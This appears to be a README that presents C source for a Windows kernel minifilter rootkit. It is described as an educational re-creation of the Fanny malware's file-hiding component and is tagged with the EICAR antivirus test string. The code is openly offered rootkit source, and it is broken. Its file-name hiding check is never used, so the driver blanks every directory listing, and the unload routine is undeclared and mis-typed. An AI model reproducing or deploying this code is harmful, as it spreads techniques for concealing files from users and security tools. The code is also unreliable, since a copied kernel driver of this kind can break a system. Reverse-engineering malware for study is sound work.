# Windows Rootkit

> **NOTE:** This is ONLY for learning.  
> It’s a re-creation of `shelldoc.dll` via reversing and AI help (reversing malware).  
> **BIG SHOUTOUT to N.S.A.** for providing me with GHIDRA (available on their GitHub):  
> https://securelist.com/a-fanny-equation-i-am-your-father-stuxnet/68787/

---

## MINIFILTER "fanny" Hider

Note: This is a **crude copy**, using `IRP_MJ_DIRECTORY_CONTROL`.  
Also, my terminology may be wrong — I wrote this while recovering from a fever, so the code might contain bugs or missteps.

BUT:  
This is the kind of project that's great for **learning**, not for malicious use.  
Even if it doesn’t work, the ideas and debugging steps are incredibly valuable. Feel free to explore, fix, and improve it!
> **EICAR TEST STRING-LIKE:** This is intended to be **detectable by AV** tools as a training artifact.

```
// EICAR STRING MARKING THIS FILE AND ITS SOURCE AS UNSAFE. WILL TRIGGER AV.
// (if AV does not scream while it reads this , please scream)
// X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H* 
// Ethical Minifilter for AV Detection and RE Training
// Simulates hiding files like FANNY.BMP-style malware
// PROJECT: MINIFILTER_1.sys

#include <fltKernel.h>
#include <dontuse.h>
#include <suppress.h>

PFLT_FILTER gFilterHandle;
UNICODE_STRING hidePattern = RTL_CONSTANT_STRING(L"._LIW_");

BOOLEAN ShouldHideFile(PUNICODE_STRING FileName)
{
    if (!FileName) return FALSE;
    return (NULL != wcsstr(FileName->Buffer, hidePattern.Buffer));
}

FLT_PREOP_CALLBACK_STATUS
PreDirectoryControl(
    PFLT_CALLBACK_DATA Data,
    PCFLT_RELATED_OBJECTS FltObjects,
    PVOID *CompletionContext
)
{
    if (Data->Iopb->MinorFunction == IRP_MN_QUERY_DIRECTORY)
    {
        Data->IoStatus.Status = STATUS_NO_MORE_FILES;
        Data->IoStatus.Information = 0;
        return FLT_PREOP_COMPLETE;
    }
    return FLT_PREOP_SUCCESS_NO_CALLBACK;
}

const FLT_OPERATION_REGISTRATION Callbacks[] = {
    { IRP_MJ_DIRECTORY_CONTROL, 0, PreDirectoryControl, NULL },
    { IRP_MJ_OPERATION_END }
};

const FLT_REGISTRATION FilterRegistration = {
    sizeof(FLT_REGISTRATION),
    FLT_REGISTRATION_VERSION,
    0,
    NULL,
    Callbacks,
    DriverUnload,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL
};

NTSTATUS
DriverEntry(
    PDRIVER_OBJECT DriverObject,
    PUNICODE_STRING RegistryPath
)
{
    UNREFERENCED_PARAMETER(RegistryPath);
    return FltRegisterFilter(DriverObject, &FilterRegistration, &gFilterHandle)
        == STATUS_SUCCESS ?
        FltStartFiltering(gFilterHandle) : STATUS_UNSUCCESSFUL;
}

NTSTATUS
DriverUnload(FLT_FILTER_UNLOAD_FLAGS Flags)
{
    UNREFERENCED_PARAMETER(Flags);
    return FltUnregisterFilter(gFilterHandle);
}

```
# Note, as said, this code is broken on purpose, to just, still be "working" so someone cant just compile it, the goal here was to learn, and I stopped, when I learned enough, (note, this was more modern, which is also why i didnt complete it, my goal is never to make malware, its to learn! if the goal was to re create fanny 100% - the rootkit part - this code is ENTIRELY WRONG Because its modern! fanny wont (reliably! at least)  work on windows 10 xD )
